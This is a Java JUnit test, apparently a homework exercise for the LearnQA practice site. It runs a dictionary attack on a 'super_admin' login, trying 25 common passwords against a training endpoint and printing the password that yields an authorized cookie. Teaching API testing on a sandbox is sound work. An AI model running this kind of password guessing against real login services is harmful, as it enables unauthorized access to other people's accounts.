import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class CheckAuthorizationTest {

    @Test
    public void checkAuthorizationTest() {
        List<String> passwords = new ArrayList<>(List.of(
                "123456", "123456789", "qwerty", "password", "1234567",
                "12345", "iloveyou", "111111", "123123", "abc123",
                "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321",
                "555555", "lovely", "7777777", "welcome", "888888",
                "princess", "dragon", "password1", "123qwe", "12345678"));

        Map<String, String> data = new HashMap<>();
        data.put("login", "super_admin");


        for (String password : passwords) {
            data.put("password", password);

            if (checkAuthCookie(data).equals("You are authorized")) {
                System.out.println(checkAuthCookie(data));
                System.out.println("Ваш пароль: " + password);
                break;
            }
        }
    }

    private Map<String, String> getSecretPasswordHomework(Map<String, String> data) {
        Response responseForGet = RestAssured
                .given()
                .body(data)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();

        String responseCookie = responseForGet.getCookie("auth_cookie");

        Map<String, String> cookies = new HashMap<>();
        cookies.put("auth_cookie", responseCookie);
        return cookies;
    }

    private String checkAuthCookie(Map<String, String> data) {
        return RestAssured
                .given()
                .body(data)
                .cookies(getSecretPasswordHomework(data))
                .when()
                .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .then()
                .extract()
                .body()
                .asString();
    }
}
